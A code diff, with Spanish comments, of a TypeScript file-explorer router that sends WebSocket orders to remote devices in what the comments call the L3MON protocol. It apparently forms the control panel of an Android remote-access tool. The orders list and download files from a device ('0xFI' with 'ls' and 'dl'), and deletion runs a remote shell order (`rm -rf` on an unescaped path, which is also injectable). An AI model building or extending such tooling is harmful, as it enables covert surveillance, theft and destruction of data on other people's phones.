@@ -55,9 +55,11 @@ export const fileExplorerRouter = router({
         const wsManager = getWebSocketManager();
         if (wsManager) {
           console.log(`[FileExplorer] Solicitando directorio '${input.path}' al dispositivo ${input.deviceId}`);
-          // El APK escucha 'order' con type '0xFI' y action 'ls' para listar archivos
-          wsManager.broadcastToDevice(input.deviceId, "request-files", {
-            payload: { path: input.path }
+          // Protocolo L3MON: evento 'order', tipo '0xFI', accion 'ls'
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xFI",
+            action: "ls",
+            path: input.path
           });
         }
 
@@ -196,9 +198,11 @@ export const fileExplorerRouter = router({
         const wsManager = getWebSocketManager();
         if (wsManager) {
           console.log(`[FileExplorer] Solicitando descarga '${input.filePath}' del dispositivo ${input.deviceId}`);
-          // El APK espera 'order' con type '0xFI' y action 'dl' para descargar
-          wsManager.broadcastToDevice(input.deviceId, "download-file", {
-            payload: { path: input.filePath }
+          // Protocolo L3MON: evento 'order', tipo '0xFI', accion 'dl'
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xFI",
+            action: "dl",
+            path: input.filePath
           });
         }
 
@@ -243,8 +247,10 @@ export const fileExplorerRouter = router({
         const wsManager = getWebSocketManager();
         if (wsManager) {
           console.log(`[FileExplorer] Solicitando eliminacion '${input.filePath}' en dispositivo ${input.deviceId}`);
-          wsManager.broadcastToDevice(input.deviceId, "delete-file", {
-            payload: { path: input.filePath }
+          // Nota: El APK base no suele tener 'delete', pero si implementamos 'rm' en ShellManager:
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSH",
+            command: `rm -rf "${input.filePath}"`
           });
         }
 
